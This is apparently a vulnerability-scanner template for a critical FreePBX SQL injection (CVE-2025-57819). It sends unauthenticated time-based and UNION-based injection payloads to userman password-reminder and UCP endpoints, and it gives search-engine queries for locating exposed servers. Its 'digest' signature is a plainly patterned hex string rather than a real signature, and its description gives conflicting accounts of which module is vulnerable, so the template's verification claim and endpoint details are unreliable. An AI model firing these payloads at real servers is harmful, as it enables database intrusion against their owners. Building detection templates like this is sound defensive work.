id: CVE-2025-57819

info:
  name: FreePBX - SQL Injection leading to Remote Code Execution
  author: nishantkluhera
  severity: critical
  description: |
    FreePBX versions 15, 16, and 17 contain a critical SQL injection vulnerability in the endpoint module that allows unauthenticated attackers to manipulate the database and execute code remotely. The vulnerability exists due to insufficient sanitization of user-supplied data in various endpoints, particularly in the userman module's checkPasswordReminder functionality and modular.php script. This can lead to authentication bypass, database manipulation, and remote code execution without authentication.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-57819
    - https://community.freepbx.org/t/endpointmanager-aug-2025-zero-day/107215
    - https://www.bleepingcomputer.com/news/security/freepbx-servers-hacked-via-zero-day-emergency-fix-released/
    - https://github.com/blueisbeautiful/CVE-2025-57819
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0
    cve-id: CVE-2025-57819
    cwe-id: CWE-89
    epss-score: 0.97435
    epss-percentile: 0.99999
    cpe: cpe:2.3:a:sangoma:freepbx:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: sangoma
    product: freepbx
    shodan-query: http.title:"freepbx administration"
    fofa-query: title="freepbx administration"
    google-query: intitle:"freepbx administration"
  tags: cve,cve2025,freepbx,sqli,rce,sangoma,unauth,critical

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/ajax.php?module=userman&command=checkPasswordReminder"
      - "{{BaseURL}}/ucp/ajax.php?module=userman&command=checkPasswordReminder"

    headers:
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      Accept: "*/*"
      X-Requested-With: "XMLHttpRequest"
      Sec-Fetch-Site: "same-origin"
      Sec-Fetch-Mode: "cors"
      Sec-Fetch-Dest: "empty"
      Referer: "{{BaseURL}}/admin/config.php?display=cxpanel_menu"

    body: |
      username=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- &password=test&loginpanel=admin

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'

      - type: status
        status:
          - 200
          - 500
        condition: or

    extractors:
      - type: regex
        part: response
        group: 1
        regex:
          - 'FreePBX ([0-9.]+)'
        internal: true
        name: version

  - method: POST
    path:
      - "{{BaseURL}}/admin/ajax.php?module=userman&command=checkPasswordReminder"
      - "{{BaseURL}}/ucp/ajax.php?module=userman&command=checkPasswordReminder"

    headers:
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      Accept: "*/*"
      X-Requested-With: "XMLHttpRequest"
      Sec-Fetch-Site: "same-origin"
      Sec-Fetch-Mode: "cors"
      Sec-Fetch-Dest: "empty"
      Referer: "{{BaseURL}}/ucp/"

    body: |
      username=test' UNION SELECT VERSION(),USER(),DATABASE()-- &password=test&loginpanel=admin

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "mysql"
          - "mariadb"
          - "asterisk"
        condition: or
        case-insensitive: true

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        group: 1
        regex:
          - '"message":"([^"]*[Mm]ysql[^"]*)"'
          - '"message":"([^"]*[Mm]ariaDB[^"]*)"'
          - '"message":"([^"]*[Aa]sterisk[^"]*)"'
        name: database_info

  - method: POST
    path:
      - "{{BaseURL}}/ucp/index.php"

    headers:
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      Accept: "*/*"
      X-Requested-With: "XMLHttpRequest"
      Referer: "{{BaseURL}}/ucp/"

    body: |
      token=test' OR SLEEP(5)-- &username=admin&password=&email=admin@test.com&quietmode=1&module=User&command=forgot

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'

      - type: status
        status:
          - 200
          - 500
        condition: or

# digest: 4b0a00483046022100c7e8f9a3d4b5c2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e602210098f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7:922c64590222798bb761d5b6d8e72950
